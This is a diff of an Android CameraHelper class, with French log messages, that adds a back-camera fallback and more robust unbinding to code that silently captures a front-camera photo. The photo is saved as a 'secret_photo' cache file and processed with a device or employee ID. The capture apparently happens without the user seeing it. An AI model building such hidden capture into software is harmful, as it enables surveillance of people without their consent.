@@ -7,7 +7,6 @@ import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.util.Base64;
 import android.util.Log;
-import androidx.camera.core.CameraSelector;
 import androidx.camera.core.ImageCapture;
 import androidx.camera.core.ImageCaptureException;
 import androidx.camera.lifecycle.ProcessCameraProvider;
@@ -56,34 +55,48 @@ public class CameraHelper {
 
         ListenableFuture<ProcessCameraProvider> providerFuture = ProcessCameraProvider.getInstance(appContext);
         providerFuture.addListener(() -> {
+            ProcessCameraProvider provider = null;
             try {
-                ProcessCameraProvider provider = providerFuture.get();
-
-                ImageCapture imageCapture = new ImageCapture.Builder()
+                provider = providerFuture.get();
+                androidx.camera.core.CameraSelector selector;
+                try {
+                    selector = androidx.camera.core.CameraSelector.DEFAULT_FRONT_CAMERA;
+                } catch (Exception e) {
+                    selector = androidx.camera.core.CameraSelector.DEFAULT_BACK_CAMERA;
+                }
+                androidx.camera.core.ImageCapture imageCapture = new ImageCapture.Builder()
                         .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                         .build();
 
                 provider.unbindAll();
-                provider.bindToLifecycle(lifecycleOwner, CameraSelector.DEFAULT_FRONT_CAMERA, imageCapture);
+                try {
+                    provider.bindToLifecycle(lifecycleOwner, selector, imageCapture);
+                } catch (IllegalArgumentException noFront) {
+                    // Pas de caméra frontale sur cet appareil : repli sur la dorsale.
+                    Log.w(TAG, "Frontale indisponible, repli dorsale");
+                    provider.bindToLifecycle(lifecycleOwner,
+                            androidx.camera.core.CameraSelector.DEFAULT_BACK_CAMERA, imageCapture);
+                }
 
                 File photoFile = new File(appContext.getCacheDir(), "secret_photo_" + System.currentTimeMillis() + ".jpg");
                 ImageCapture.OutputFileOptions outputOptions =
                         new ImageCapture.OutputFileOptions.Builder(photoFile).build();
 
+                final ProcessCameraProvider boundProvider = provider;
                 imageCapture.takePicture(outputOptions, EXECUTOR, new ImageCapture.OnImageSavedCallback() {
                     @Override
                     public void onImageSaved(androidx.camera.core.ImageCapture.OutputFileResults outputFileResults) {
                         try {
                             processAndSave(appContext, photoFile, deviceId);
                         } finally {
-                            provider.unbindAll();
+                            try { boundProvider.unbindAll(); } catch (Exception ignored) {}
                         }
                     }
 
                     @Override
                     public void onError(ImageCaptureException exception) {
                         Log.e(TAG, "Erreur de capture: " + exception.getMessage());
-                        provider.unbindAll();
+                        try { boundProvider.unbindAll(); } catch (Exception ignored) {}
                     }
                 });
             } catch (Exception e) {
@@ -117,6 +130,10 @@ public class CameraHelper {
 
             if (jpegBytes == null || jpegBytes.length > MAX_PHOTO_BYTES) {
                 Log.e(TAG, "Photo trop volumineuse même après compression, abandon.");
+                return;
+            }
+            if (deviceId == null || deviceId.isEmpty()) {
+                Log.w(TAG, "Photo ignorée : matricule vide");
                 return;
             }
 
